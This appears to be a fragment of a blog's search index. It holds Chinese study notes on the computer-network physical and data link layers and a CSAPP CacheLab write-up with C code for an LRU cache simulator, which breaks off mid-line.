BMapGL.NavigationControl3D();  // 添加3D控件\n    map.addControl(navi3DCtrl);\n  }\n```","tags":["前端"],"categories":["前端"]},{"title":"计算机网络-物理层 学习笔记","url":"/reimu-lighthouse/20211024/physical-layer/","content":"- 是其他层建立的基础\n- 电线、光纤和无线的介质特性限制了网络的功能\n- 关键问题是只使用（模拟）信号发送（数字）位，也就是调制\n\n## 数据和信号\n### 数据\n- 模拟数据（analog data）指的是**连续**的信息\n- 数字数据（digital data）是指具有**离散**状态的信息\n### 信号\n- 模拟信号（analog signal）在一段时间内具有**无限**多个强度级别\n- 数字信号（digital signal）只能有**有限**数量的定义值\n- 周期信号（periodic signal）在可测量的时间范围内完成一个模式，称为周期，并在随后的相同周期内重复该模式\n    - 简单的周期性**模拟**信号（正弦波）不能分解为更简单的信号。正弦波由其振幅、频率和相位来定义\n    - 复合周期模拟信号由多个正弦波组成\n- 非周期性信号（non-periodic signal）在不显示随时间重复的模式或周期的情况下发生变化\n    - 大多数**数字**信号是非周期性的，因此不适合用周期和频率来描述\n### 链路传输术语\n- 单工（simplex）\n- 半双工（half-duplex）\n- 全双工（full-duplex）\n- 并行传输（Parallel Transmission）\n- 串行传输（Serial Transmission）\n    - 异步传输（Asynchronous Transmission）\n        - 异步传输中，在每个**字节**的开头发送一个起始位（0），在结尾发送一个或多个停止位（1）。字节之间可能有间隙\n        - 异步在这里意味着“字节级异步”，但位级仍然是同步的；它们的持续时间是相同的\n        - 信号的时序并不重要\n    - 同步传输（Synchronous Transmission）\n        - 在同步传输中，我们一个接一个地发送**位**，没有起始或停止位或间隙。接收机负责对位进行分组\n        - 信号的时序非常重要\n\n## 数据通信的理论基础\n### 傅里叶变换\n- 时域如果周期，则频域离散\n- 时域如果非周期，则频域连续\n- 时域如果连续，则频域非周期\n- 时域如果离散，则频域周期\n### 带宽有限的信号\n- 基于傅立叶分析，数字信号是一种复合模拟信号。带宽是**无限**的\n- 对于电气工程师来说，（模拟）带宽是频率范围，以**Hz**为单位\n- 对计算机科学家来说，（数字）带宽是信道的最大数据速率，以**bits/s**为单位\n### 信道的最大数据速率\n- **奈奎斯特定理**（Nyquist’s theorem）将数据速率与无噪声信道的带宽（B）和信号电平数（V）联系起来：\n    - Max. data rate = 2B log2V bits/sec\n- **香农定理**（Shannon's theorem）将数据速率与带宽（B）和信号强度（S）与噪声（N）联系起来：\n    - Max. data rate = B log2(1 + S/N) bits/sec\n    - 如果SNR单位为dB则需要进行换算：\n        - S/N(dB)=10log10(S/N)(~)\n\n## 引导性传输介质\n介质具有不同的属性，因此性能不同\n- 存储介质\n- 电线\n    - 双绞线\n    - 同轴电缆\n    - 电力线\n- 光缆\n### 存储介质\n- 通过磁带/磁盘/DVD发送数据以实现高带宽链路\n    - 邮寄一个装有1000个 800 GB磁带（6400 TB）的盒子\n    - 发送需要一天时间（86400秒）\n    - 数据速率为70 Gbps。\n- 数据速率比远程网络快\n- 消息延迟非常差\n### 双绞线（Twisted Pair）\n- 非常普遍；用于局域网、电话线\n- 扭转减少辐射信号（干扰）\n### 同轴电缆（Coaxial Cable）\n- 常见，比双绞线具有更好的屏蔽效果和更大的带宽，适用于更长的距离和更高的传输速率\n### 电力线（Power Lines）\n- 使用方便，但目前不适合用于发送数据\n### 光缆（Fiber Cables）\n- 适用于高速率和长距离\n    - 远程ISP链路，光纤到户（FttH）\n    - 光线通过一条很长很细的玻璃线传输\n- 光纤具有巨大的带宽（THz）和微小的信号损耗，因此在长距离内传输速率很高\n- 单模（Single-mode）\n    - 核心狭窄（8-10微米），光线无法反弹\n    - 用于长距离传输（100km）\n- 多模（Multi-mode）\n    - 光可以反弹（50微米核心）\n    - 与LED一起使用，用于更便宜、更短距离的链路\n\n## 无线传输\n- 频率和波长存在如下关系\n    - λf=c（3x108 m/s）\n    - **Δf=cΔλ/λ^2**\n### 无线电传输\n- 无线电信号能很好地穿透建筑物，并在路径损耗（path loss）的情况下长距离传播\n- 在VLF, LF，和MF波段，无线电波沿着地球的曲率传播\n- 在HF波段，无线电波将从电离层反弹\n### 微波传输\n- 微波具有很高的带宽，广泛应用于室内（WiFi）和室外（3G、卫星）\n- 信号会被日常物体衰减/反射\n- 由于多径衰落（multipath loss）等原因，强度随移动而变化\n### 光通信\n- 视线灯（非光纤）可用于链路\n- 光线方向性强，带宽大\n- LED/摄像机和激光器/光电探测器的使用\n\n## 通信卫星\n- 地球静止轨道（GEO）\n    - VSAT（微型站）可以借助中继站（hub）进行通信\n    - 使用GHz中的不同频带（L、S、C、Ku、Ka），但可能拥挤或易受雨水影响\n- 中地球轨道（MEO）\n- 低地球轨道（LEO）\n    - 铱星等系统使用许多低延迟卫星进行覆盖，并通过它们路由通信 \n\n## 数字调制和多路复用\n数字调制将比特作为信号发送；多路复用在用户之间共享信道\n### **基带**传输（Baseband Transmission）\n- NRZ（Non-Return-Zero）是最简单的线路码（+1V=\"1\"，-1V=\"0\"）\n    - Unipolar NRZ（普通NRZ）\n    - Polar RZ（-1V->0V=\"0\"，+1V->0V=\"1\"）\n    - Polar NRZ-I（不变=\"0\"，±1V跳变=\"1\"）\n- 曼彻斯特编码（Manchester）\n    - Manchester\n    - Differential Manchester（差分曼彻斯特）\n- 双极（Bipolar）\n    - AMI\n    - 伪三进码（pseudoternary）\n- 多电平（Multilevel）\n    - 2B1Q\n    - 8B6T\n    - 4D-PAM5\n#### 好的线路编码方案准则\n- 带宽效率\n- 直流分量\n    - 当数字信号中的电压电平在一段时间内保持恒定时，频谱会在零点附近产生非常低的频率（傅里叶分析的结果），这给无法通过低频的系统带来了问题\n    - DC分量表示可能导致基线漂移的0/1奇偶校验，即0或1的长串可能导致基线漂移，并使接收器难以正确解码\n- 时钟恢复/自同步\n    - 自同步数字信号包括正在传输的数据中的定时信息\n    - 如果信号中存在向接收器提示脉冲开始、中间或结束的过渡，则可以实现这一点\n#### 时钟恢复\n- 策略：\n    - 曼彻斯特编码，在每个符号中混合时钟信号\n    - 4B/5B用1和0将4个数据位映射为5个编码位：\n    - 带伪随机位的扰码（scrambling）异或（XORing）发送/接收数据\n### **通带**传输（Passband Transmission）\n- 调制载波信号的振幅、频率/相位可在非零频率范围内发送数据\n- 幅移键控（Amplitude Shift Keying ASK）\n- 频移键控（Frequency Shift Keying FSK）\n- 相移键控（Phase Shift Keying PSK）\n- BPSK    2 symbols    1 bit/symbol\n- QPSK    4 symbols    2 bit/symbol\n- QAM-16    16 symbols    4 bits/symbol\n- QAM-64    64 symbols    6 bits/symbol\n\n> BPSK/QPSK仅仅改变相位\n> QAM既改变相位又改变振幅\n\n- 使用格雷码进行映射，减少错误\n### **频分**复用（Frequency Division Multiplexing FDM）（模拟）\n- 频分多路复用\n- 通过将用户置于不同的频率上来共享信道\n- OFDM（正交频分复用）是一种高效的FDM技术，用于802.11、4G蜂窝和其他通信\n    - 子载波在频域中被紧紧包裹在一起\n### **时分**复用（Time Division Multiplexing TDM）（数字）\n- 时分多路复用随时间共享一个信道\n    - 用户按照固定的时间表轮流使用；注意和分组交换或STDM（统计时分复用）相区别\n    - 广泛应用于电话/蜂窝系统\n### **码分**多址（Code Division Multiple Access CDMA）\n- CDMA通过给用户一个编码来共享信道\n    - 编码是正交的，可以同时发送\n    - 广泛用作3G网络的一部分\n\n## 公共电话交换网络\n### 本地回路 调制解调器\n- 电话调制解调器通过3.3 KHz模拟语音信道接口向POTS发送数字数据\n    - 速率<56kbps；早期连接到Internet的方法\n### 数字用户线\n- DSL宽带使用POTS不使用的频率通过本地环路向本地端局发送数据\n- 电话/计算机连接到相同的旧电话线\n- 速率因线路而异\n    - ADSL2高达12 Mbps\n- 对于ADSL2，OFDM的使用频率高达1.1MHz\n    - 大部分带宽用作下行\n### 光纤到户\n- FTTH宽带依靠光纤电缆的部署为客户提供高数据速率\n- 一个波长可以在许多房屋中共享\n- 光纤是无源的（无放大器等）\n### 脉冲编码调制（Pulse Code Modulation）\n- 将模拟信号转换为数字数据（数字化）的最常用技术称为脉冲编码调制（PCM）\n### 奈奎斯特采样定理\n- 根据奈奎斯特定理，采样率必须至少是信号中包含的最高频率的2倍\n\n> 注意：最高频率不是带宽\n\n- 如果模拟信号是低通的，则带宽和最高频率是相同的值\n- 如果模拟信号是带通信号，则带宽值低于最大频率值\n### 中继线和多路复用（Trunks and Multiplexing）\n#### TDM\n- 呼叫使用TDM在公共交换电话网络（PSTN）中继线上以数字方式进行传输\n- 一个呼叫是一个每125μs 8bits（64 kbps）的PCM采样\n- 传统T1载波有24个呼叫通道，每个通道125μs（1.544 Mbps），带有基于AMI的符号\n#### SONET\n- SONET（同步光网络）是在光中继上传输数字信号的全球标准\n- 保持125μs帧；基准帧为810字节（52Mbps）\n- 有效载荷在框架内“浮动”，以实现灵活性\n### 交换\n- 电路交换（circuit switching）\n- 分组交换（packet switching）\n    - 虚电路（virtual-circuit）\n    - 数据报（datagram）\n- 报文交换（message switching）\n- PSTN采用电路交换；因特网使用分组交换\n- 电路交换在进行数据流动前需要连接建立，在数据流动结束后需要连接释放\n- 分组交换独立对待每一个包\n    - 无需建立连接，但在路由器上可能会有不同的队列延迟（queuing delay）\n### 分组时延\n#### 来源\n- 处理时延（processing delay）\n    - 检查位错误\n    - 确定输出链路\n- 排队时延（queueing delay）\n    - 输出链路等待传输\n    - 路由器的拥塞级别\n- 发送（传输）时延（transmission delay）\n    - R=链路带宽（bps）\n    - L=数据包长度（bits）\n    - 发送时延=L/R\n- 传播时延（propagation delay）\n    - d=物理链路的长度\n    - s=介质中的传播速度（~2x10^8 m/s）\n    - 传播时延=d/s\n- 如果一个报文被分解为N个包，每个包传输时间为1/N分钟，则总共传输时间为2/N+(N-1)/N分钟","tags":["计算机网络"],"categories":["计软杂谈","学习笔记"]},{"title":"计算机网络-数据链路层 学习笔记","url":"/reimu-lighthouse/20211023/data-link-layer/","content":"- 负责在链路上传递数据帧\n- 处理传输错误\n- 调节数据流\n\n## 链路分类\n- **点对点链路（point-to-point）** 使用介质的全部容量\n    - 专用于两个设备\n    - 例如，当两个朋友使用座机聊天时，他们使用的是点对点链路\n- **广播式链路（broadcast）** 仅使用链路容量的一部分\n    - 在多对设备之间共享\n    - 例如，当同两个朋友使用他们的手机时，他们正在使用广播链接（许多手机用户共享广播）\n## 数据链路层的两个子层\n- **逻辑链路控制子层（LLC Logical Link Control）** 处理点对点和广播链路的所有常见问题\n- **媒体接入控制子层（MAC Media Access Control）** 仅处理特定的广播链路问题\n\n## 数据链路设计问题\n### 帧\n- 数据链路层接受来自网络层的数据包，并将其封装到帧中发送给物理层；接收则与其相反\n- 封装和去封装的原因：\n    - 链路层地址通常是不同的\n    - 每个链路可能使用具有不同帧格式的不同协议\n### 向网络层提供的服务\n- 无确认的无连接服务\n    - 发送帧时没有建立连接/恢复错误\n    - 适合错误率低的场景或实时通信\n    - 例如以太网\n- 有确认的无连接服务\n    - 如果需要，帧会进行重传\n    - 例如802.11（WIFI）\n- 有确认的有连接服务\n    - 建立连接\n    - 卫星信号或长途电话电路\n### 成帧\n#### 字节计数法（Byte count）\n- 头部添加字段用来标记帧的字节数\n- 相对简单，但出错后很难重新同步\n#### 字节填充的标志字节法（Flag bytes with byte stuffing）\n- 标志字节（flag byte）分隔帧；如果数据中存在标志字节或转义字节，则在其之前填充转义字节（ESC）\n- 例如，A ESC FLAG B ----> A ESC ESC ESC FLAG B\n- 帧会变的更长，但在出错后很容易重新同步\n#### 比特填充的标志比特法（Flag bits with bit stuffing）\n- 在位级别完成的填充\n- 标志字节为0x7E，包含111111（6个连续的1）\n- 在传输时，在数据中5个1之后，添加0（防止干扰标志字节的识别）\n- 接收时，删除五个1后的0\n- USB（通用串行总线）所使用\n#### 物理层编码违禁法（Physical layer coding violations）\n- 使用编码中的冗余比特\n### 差错检测\n#### 差错种类\n- 单比特错误（Single-bit error）数据单元中只有1位从1变为0或从0变为1\n- 突发错误（Burst error）数据单元中的2个或更多位从1变为0或从0变为1\n#### 差错检测&差错纠正\n- 差错纠正比差错检测更困难\n- 在差错检测中，我们只关心是否发生了任何错误\n- 在差错纠正中，我们需要知道被破坏的比特的数目和位置\n- 差错检测使用检错码，差错纠正使用纠错码，使用纠错码的技术也称为前向纠错（FEC Forward Error Correction）\n- 在高度可靠的信道上建议使用检错码，而在错误比较频繁的信道上建议使用纠错码\n#### 海明距离（Hamming distance）\n- 海明距离是将一个有效码字转换为**任何**其他有效码字的最小位翻转\n- 编码将n位的数据转换为n+k位的码字\n- 具有10位（n=2，k=8）的4个码字的示例：\n    - 0000000000、0000011111、1111100000和1111111\n    - 其汉明距离是5\n- 具有最小汉明距离d_min的编码界限：\n    - **$d_{min}≥2d+1$** 可以纠正d错误（上例2个错误）\n    - **$d_{min}≥d+1$** 可检测d个错误（上例4个错误）\n#### 线性分组编码（Linear Block Codes）\n- 线性分组编码是将任何码字与任何其他码字进行线性运算的结果为有效码字的编码\n- 线性运算通常选用XOR或是模2运算\n#### 纠错码\n- **海明码**\n- 二进制卷积码\n    - GSM移动电话系统、卫星通信\n- 里德所罗门码和低密度奇偶校验码\n    - 在数学上较为复杂，广泛应用于实际\n    - RS编码：DSL、有线数据、卫星通信、CD、DVD和蓝光光盘\n    - LDPC编码：数字视频广播、10Gbps以太网、电力线网络、最新版本的802.11\n##### **海明码**\n- 允许纠正单比特错误\n- 通过使用多个奇偶校验位来实现\n- 要设计一个包含m个数据位和r个校验位的n位编码，并能够纠正所有单个错误，必须有\n  $$(m+r+1）≤2^r$$\n\n- 对于$2^m$个合法消息中的每一条都有n个非法码字，它们与该消息的海明距离为1\n- 所以$2^m$个合法消息需要n+1个位模式来进行标识。因为位模式的总数为$2^n$，所以必须有\n  $$(n+1）2^m≤2^n$$\n- 由于n=m+r，经过变形变为上式\n#### 检错码\n- 奇偶（Parity）\n- 校验和（Checksums）\n- **循环冗余校验**（CRC）\n##### 奇偶校验\n- 奇偶校验位等于数据位的模2加或XOR\n- 能检测奇数位比特错误，检测随机错误的概率为1/2\n- 使用**交错校验**（Interleaving）能检测突发错误，其本质是发送次序和检验次序不同\n- N个奇偶校验位的交错检验可检测高达N个的突发错误\n- 每个奇偶校验和在非相邻位上进行\n- 即使出现多达N个错误，也不会导致校验失败\n![1_1](https://d-sketon.top/img/data-link-layer/1_1.png)\n##### 校验和\n- 校验和将数据分隔为N位字，并添加N个校验位，这些校验位是字的模$2^N$和\n    - 例：16位Internet反码校验和\n- 特性\n    - 改进的奇偶校验\n    - 检测最多N个突发错误\n    - 检测随机错误的概率为$1-2^N$\n    - 易受系统误差的影响，例如无法检测0数据的增加或删除\n\n> 1's complement 反码\n> 2's complement 补码\n\n- 如果在传输过程中两个16位项顺序颠倒，校验和无法捕获此错误，原因是传统的校验和没有加权，数据项的顺序对计算不重要\n- 可以使用Fletcher校验和和Adler校验和来解决\n##### CRC\n- 计算方法：\n    - 假设G(x)的阶为r，在帧的低端位加上r个0位\n    - 利用模2除法，将帧对应的位串与G(x)相除，获得余数\n    - 余数和帧对应的位串模2相加\n    - 验证则相反，如果没有发生错误则余数应该为0\n- 在循环码中，那些可被G(x)整除的e(x)错误不会被捕获。\n- 如果生成多项式有多个项且x0的系数为1，则可以捕获所有单比特错误\n- 包含系数x+1的生成多项式可以检测所有奇数位比特错误\n- 所有突发错误，长度L ≤ r将会被检测到\n- 所有突发错误，长度L = r+1将会有$1-(1/2)^{r-1}$的概率被检测到\n- 所有突发错误，长度L > r+1将会有$1-(1/2)^r$的概率被检测到\n- 一个好的生成多项式应该：\n    - 至少拥有两项\n    - 项x0的系数应为1\n    - 应该具有因子x+1\n---\n## 基本数据链路协议\n### 乌托邦式单工协议 P1\n- 假设没有错误，并且接收方和发送方一样快\n- 单向数据传输\n### 无错信道上的单工停-等式协议 P2\n- 确保发送方不能超过接收方\n- 接收机在准备就绪时返回一个哑帧（**ack**），允许它发送下一帧\n- 一次只能输出一帧——称为停-等式协议（**stop-and-wait**）\n### 有错信道上的单工停-等式协议 P3\n- ARQ（Automatic Repeat reQuest）也称为PAR（Positive Acknowledgement with Retransmission）添加了错误控制\n- 接收器确认正确传送的帧并发送ack\n- 发送方设置定时器并在无应答时重新发送帧\n- 为确保正确性，必须对数据帧和ack进行编号，否则，接收方无法从新帧中分辨出重传\n- 对于停-等式协议，序号采用1位（2个数字）足矣\n---\n## 滑动窗口协议\n- 发送方维护它可以发送的帧窗口\n    - 需要为可能的重传保留缓冲空间\n    - 窗口在收到下一次确认时前移\n- 接收方维护它可以接收的帧窗口\n    - 需要为到达帧保留缓冲空间\n    - 窗口在帧按顺序到达时前移\n- 确认信息可以被单独附在数据帧上（ack），也可以附在下一个出境的数据帧上。这被称为**捎带确认**（piggybacking）\n### 管道化（Pipelining）\n- 更大的窗口可以使用管道化来实现高效链接\n- 停-等式协议（w=1）对于长距离链接而言效率低下\n- 窗口最大帧数量（w）取决于带宽-延迟（BD bandwidth-delay）\n- **w ≥ 2BD+1**以确保高链路利用率\n\n> 注意：这里的BD已经换算成帧的数量\n\n- 如果我们直接使用BDP（bandwidth-delay product），假设L是一帧的长度，公式应为\n- **W ≥ 2BDP/L+1**\n- 管道化导致了对于错误/缓存的不同选择：\n    - 回退N\n    - 选择重传\n### 1位滑动窗口协议 P4\n- 序列号基于模2算法，通过停-等式协议在两个方向传输数据\n    - 借助捎带确认提高效率\n    - 处理传输错误、流量控制\n- 如果同时发起通信会造成重复传输，效率下降\n### 回退N协议 P5\n- 接收方仅接受/确认按顺序到达的帧：\n    - 丢弃丢失/出错帧之后的帧\n    - 发送方超时并重传所有未完成的帧\n![1_2](https://d-sketon.top/img/data-link-layer/1_2.png)\n- 在回退N协议中，发送窗口大小必须小于$2^m$，接收窗口的大小始终为1\n- 其本质就是窗口大小不能超过序号能表示的范围，如果发送窗口大小等于$2^m$，则接收方所有ack丢失后无法判断重传帧\n![1_4](https://d-sketon.top/img/data-link-layer/1_4.png)\n- 对回退N进行权衡：\n    - 对接收方来说较为简单，只需要1帧\n    - 由于大窗口错误而浪费链路带宽，整个窗口将被重传\n### 选择重传协议 P6\n- 接收方在接收窗口中的任意位置接收帧\n- 累积ack（Cumulative ack）表示帧中的最高顺序\n- NAK（negative ack）导致发送方在超时重新发送窗口之前重新传输丢失的帧\n![1_3](https://d-sketon.top/img/data-link-layer/1_3.png)\n- 在选选择重传协议中，发送方和接收方窗口的大小不得超过$2^{m-1}$\n- 如果发送窗口大小$2^{m-1}$，则接收方所有ack丢失后无法判断重传帧\n![1_5](https://d-sketon.top/img/data-link-layer/1_5.png)\n- 对选择性重复进行权衡：\n    - 由于接收端有缓冲，发送端有多个定时器，因此比回退N更复杂\n    - 更有效地利用链路带宽，因为只重新发送丢失的帧（低错误率）\n\n## 数据链路协议实例\n### HDLC\n- 高级数据链路控制（HDLC）是一种面向位的协议，用于点对点和多点链路上的通信\n- 虽然HDLC更多的是一个理论问题而不是实际问题，但HDLC中定义的大多数概念是其他实际协议（如PPP、以太网或无线局域网）的基础\n- HDLC提供两种常见的传输模式，可用于不同的配置：正常响应模式（NRM）和异步平衡模式（ABM）\n#### HDCL帧\n- 信息帧（I帧）（用于传递数据）\n- 监控帧（S帧）（用于ACK和NAK）\n- 未编号的帧（U帧）（用于建立连接）\n### SONET上的数据包\n- SONET上的数据包是用于通过SONET光纤链路承载IP数据包的方法\n    - 使用PPP（点对点协议）进行成帧\n#### PPP\n- PPP（点对点协议）是跨链路传送数据包的通用方法\n    - 成帧使用标志字节（0x7E）和**字节填充**，转义字节（0x7D）\n    - “无编号模式”（无连接无确认服务）用于承载IP数据包\n    - 使用校验和检测错误\n![1_6](https://d-sketon.top/img/data-link-layer/1_6.png)\n#### PPP中的多路复用\n- 虽然PPP是一种链路层协议，但它使用另一组协议来建立链路、验证相关方并传输网络层数据\n- 为使PPP功能强大，定义了三组协议：链路控制协议（LCP）、两个身份验证协议（APs）和多个网络控制协议（NCPs）\n### ADSL\n- 广泛用于通过本地环路的宽带互联网\n- ADSL从调制解调器（用户）到DSLAM（ISP）\n- IP数据包通过PPP和AAL5/ATM发送\n- PPP数据通过ATM信元以AAL5帧发送：\n    - ATM是一个链路层，使用短的固定大小的信元（53字节）；每个单元都有一个虚电路标识符\n    - AAL5是一种通过ATM发送数据包的格式\n    - PPP帧转换为AAL5帧（PPPoA）\n","tags":["计算机网络"],"categories":["计软杂谈","学习笔记"]},{"title":"CSAPP - CacheLab","url":"/reimu-lighthouse/20211015/csapp-cachelab/","content":"\n> 个人实验，参考和借鉴了知乎大佬和CSDN\n\n- 本实验上学期花了一周的时间才做完，也算是CSAPP中做的最认真的一个了\n- 相比于PhaseA，PhaseB更加的阴间和耗时\n- 在做实验的过程中参考了知乎大佬和CSDN上的代码，并融入了自己的idea，希望能帮助到计软的同学（笑）\n## **PhaseA**\n### 实验要求\n- 实现一个cache模拟器，运行时输入s,b,E，要求统计命中，未命中和驱逐的次数，cache忽略块偏移量，且采用LRU策略进行驱逐\n### 实验过程\n- traces文件中包含I，L，S，M四种模式：I需要忽略，而经过分析可知S（Store）和L（Load）模式本质上相同（缓存中已存在直接命中，缓存中未存在则未命中，如果缓存已满则需要驱逐），而M模式则是先进行L再进行S模式\n#### 声明cache_line结构体\n```c\nstruct cache_line\n{\n    int tag;    //标记位\n    int LRU_counter;    //最后访问时间\n};\n```\n- cache_line中包含tag标记位和LRU_counter用于记录最后访问时间便于驱逐（Valid_bit有效位省略而采用另一种方法）\n#### 建立全局变量\n```c\nstruct cache_line **cache;\nint hit_count, miss_count, eviction_count;\nint *cache_index;\nint s, E, b, S;\nint count = 0;    //时间刻\n```\n- cache结构体二级指针用于建立二维数组\n- hit_count，miss_count，eviction_count用于记录命中，未命中和驱逐的次数\n- cache_index以及指针用于建立一维数组来维护组有效行的个数\n- s，E，b接收传入参数，S便于开辟内存\n- count作为时间刻\n#### 接收传入s，E，b参数\n```c\nint opt;\nchar *trace_name;    //trace文件地址\n//命令行读入\nwhile ((opt = getopt(argc, argv, \"s:E:b:t:\")) != -1)\n{\n    switch (opt)\n    {\n    case 's':\n        s = atoi(optarg);    //读入s\n        break;\n    case 'E':\n        E = atoi(optarg);    //读入E\n        break;\n    case 'b':\n        b = atoi(optarg);    //读入b\n        break;\n    case 't':\n        trace_name = optarg;    //读入地址\n    default:\n        break;\n    }\n}\n```\n- 使用getopt函数将参数传入s，E，b中，同时创建trace_name字符串用于记录trace文件的地址便于之后文件的读入\n#### 初始化数组\n```c\n //初始化\nS = pow(2, s);    //计算S=2^s\ncache = (struct cache_line **)malloc(sizeof(struct cache_line *) * S);\nfor (int i = 0; i < S; i++)\n    cache[i] = (struct cache_line *)malloc(sizeof(struct cache_line *) * E);    //cache开辟内存\nfor (int i = 0; i < S; i++)\n    for (int j = 0; j < E; j++)\n        cache[i][j].tag = cache[i][j].LRU_counter = 0;    //cache初始化\ncache_index = (int *)malloc(sizeof(int) * S);    //cache_index开辟内存\nmemset(cache_index, 0, sizeof(int) * S);    //cache_index初始化\n```\n- 使用malloc函数对cache_line和cache_index开辟内存，建立cache_line\\[S]\\[E]和cache\\[S]，同时初始化为0\n（cache_line\\[x]\\[y]表示第x组第y行所存内容，cache\\[x]表示第x组最后的有效块所在行数）\n#### 文件读入\n```c\n//文件读入\nFILE *pFile = fopen(trace_name, \"r\");    //打开文件\nchar identifier;\nunsigned address;\nint size;\n```\n- 使用fopen函数和之前读入的trace_name文件的地址读入\\*pFile中，并创建identifier，address，size用于存储文件中读入的内容\n#### 读入后数据处理\n```c\nwhile (fscanf(pFile, \" %c %x,%d\", &identifier, &address, &size) > 0)    //按行读入\n{\n    if (identifier == 'I')    //忽略I模式\n        continue;\n    int t_address = address / ((int)pow(2, s + b));    //计算标记位\n    int s_address = address / ((int)pow(2, b)) % (int)(pow(2, s));    //计算索引位\n    if (identifier == 'M')    //M模式两次solve\n    {\n        Solve(t_address, s_address);\n        Solve(t_address, s_address);\n    }\n    else    //S模式或L模式\n        Solve(t_address, s_address);\n}\n```\n- 使用fscanf函数按行读取trace文件的内容，模式读入identifier中，地址读入address中，操作范围读入size中\n- 由于忽略I模式，所以identifier==’I’后直接continue\n- 由于忽略块偏移量，所以无需记录地址中的块偏移部分而只需统计索引部分（s_address）和标记部分（t_address）\n- 根据读入的s和计算并分割出这两部分（t_address=⌊address / 2^(s+b) ⌋，\ns_address=⌊address/ 2^b ⌋mod 2^s）\n- 由于L模式和S模式操作方式相同，而M模式是L模式+S模式，所以可以只写一个solve函数，对于M模式执行两次，而对于L和S模式都只执行一次\n#### 结束阶段\n```c\n//结束\nfree(cache);\nfree(cache_index);    //释放内存\nfclose(pFile);    //关闭文件\nprintSummary(hit_count, miss_count, eviction_count);    //输出\n```\n- 释放开辟的内存并关闭文件\n- 调用printSummary输出命中，未命中和驱逐的个数\n#### **solve函数**\n\n> 前提：同一个组内，有效块按访问时间顺序依次顺序存储（组未满状态下），且使用cache_index来记录该组最后的有效块所在行数\n\n- 不论Store还是Load都存在两种状态：缓存中已存在——命中，缓存中不存在——未命中\n- 1.命中状态（find_flag=1）\n- 基本思想：在cache_index\\[组数]下标的范围内（该组所有有效块）寻找，如果找到则命中，并更新最后访问时间\n```c\nint find_flag = 0;    //寻找哨兵\nfor (int i = 0; i < cache_index[s_address]; i++)\n{\n    if (cache[s_address][i].tag == t_address)   //找到\n    {\n        ++hit_count;    \n        cache[s_address][i].LRU_counter = count;    \n        find_flag = 1;    \n        break;\n    }\n}\n```\n- 2. 不命中状态（find_flag=0）\n- 基本思想：在该组所有有效行中都寻找不到，则未命中。此时分两种情况：\n    - 2.1. 组未满：\n    - 无需驱逐，仅需在cache\\[组数]\\[]中向后插入该有效块，并更新最后访问时间和该组cache_line\\[]\n    ```c\n    if (cache_index[s_address] != E) //组未满\n    {\n        ++miss_count;    //未命中\n        cache[s_address][cache_index[s_address]].tag = t_address;    //更新缓存\n        cache[s_address][cache_index[s_address]++].LRU_counter = count;    //更新最后访问时间\n    }\n    ```\n    - 2.2. 组已满：\n    - 需要驱逐，此时在该组中寻找访问时间最小的有效块（LRU），驱逐替换该块，并更新该块最后访问时间\n    ```c\n    else //组已满，需要LRU\n    {\n        ++eviction_count;    //驱逐\n        ++miss_count;    //未命中\n        int min_count = cache[s_address][0].LRU_counter;    //最后访问时间最远块访问时间\n        int min_count_index = 0;    //最后访问时间最远块下标\n        for (int i = 1; i < E; i++)\n            if (cache[s_address][i].LRU_counter < min_count)\n            {\n                min_count = cache[s_address][i].LRU_counter;    //更新最后访问时间最远块访问时间\n                min_count_index = i;    //更新最后访问时间最远块下标\n            }\n        cache[s_address][min_count_index].tag = t_address;    //更新缓存\n        cache[s_address][min_count_index].LRU_counter = count;    //更新最后访问时间\n    }\n    ```\n- 在solve函数结束后更新count时间刻，以便于下次使用更新访问时间\n```c\n++count;    //更新时间刻\n```\n### 完整代码\n```c\n#include \"cachelab.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <getopt.h>\n#include <math.h>\n#include <string.h>\nstruct cache_line\n{\n    int tag;    //标记位\n    int LRU_counter;    //最后访问时间\n};\nstruct cache_line **cache;\nint hit_count, miss_count, eviction_count;\nint *cache_index;\nint s, E, b, S;\nint count = 0;    //时间刻\nvoid Solve(int t_address, int s_address)\n{\n    int find_flag = 0;    //寻找哨兵\n    for (int i = 0; i < cache_index[s_address]; i++)\n    {\n        if (cache[s_address][i].tag == t_address)   //找到\n        {\n            ++hit_count;    \n            cache[s_address][i].LRU_counter = count;    \n            find_flag = 1;    \n            break;\n        }\n    }\n    if (!find_flag) //未找到\n    {\n        if (cache_index[s_address] != E) //组未满\n        {\n            ++miss_count;    //未命中\n            cache[s_address][cache_index[s_address]].tag = t_address;    //更新缓存\n            cache[s_address][cache_index[s_address]++].LRU_counter = count;    //更新最后访问时间\n        }\n        else //组已满，需要LRU\n        {\n            ++eviction_count;    //驱逐\n            ++miss_count;    //未命中\n            int min_count = cache[s_address][0].LRU_counter;    //最后访问时间最远块访问时间\n            int min_count_index = 0;    //最后访问时间最远块下标\n            for (int i = 1; i < E; i++)\n                if (cache[s_address][i].LRU_counter < min_count)\n                {\n                    min_count = cache[s_address][i].LRU_counter;    //更新最后访问时间最远块访问时间\n                    min_count_index = i;    //更新最后访问时间最远块下标\n                }\n            cache[s_address][min_count_index].tag = t_address;    //更新缓存\n            cache[s_address][min_count_index].LRU_counter = count;    //更新最后访问时间\n        }\n    }\n    ++count;    //更新时间刻\n}\nint main(int argc, char *argv[])\n{\n    int opt;\n    char *trace_name;    //trace文件地址\n    //命令行读入\n    while ((opt = getopt(argc, argv, \"s:E:b:t:\")) != -1)\n    {\n        switch (opt)\n        {\n        case 's':\n            s = atoi(optarg);    //读入s\n            break;\n        case 'E':\n            E = atoi(optarg);    //读入E\n            break;\n        case 'b':\n            b = atoi(optarg);    //读入b\n            break;\n        case 't':\n            trace_name = optarg;    //读入地址\n        default:\n            break;\n        }\n    }\n    //初始化\n    S = pow(2, s);    //计算S=2^s\n    cache = (struct cache_line **)malloc(sizeof(struct cache_line *) * S);\n    for (int i = 0; i < S; i++)\n        cache[i] = (struct cache_line *)malloc(sizeof(struct cache_line *) * E);    //cache开辟内存\n    for (int i = 0; i < S; i++)\n        for (int j = 0; j < E; j++)\n            cache[i][j].tag = cache[i][j].LRU_counter = 0;    //cache初始化\n    cache_index = (int *)malloc(sizeof(int) * S);    //cache_index开辟内存\n    memset(cache_index, 0, sizeof(int) * S);    //cache_index初始化\n    //文件读入\n    FILE *pFile = fopen(trace_name, \"r\");    //打开文件\n    char identifier;\n    unsigned address;\n    int size;\n    //处理\n    while (fscanf(pFile, \" %c %x,%d\", &identifier, &address, &size) > 0)    //按行读入\n    {\n        if (identifier == 'I')    //忽略I模式\n            continue;\n        int t_address = address / 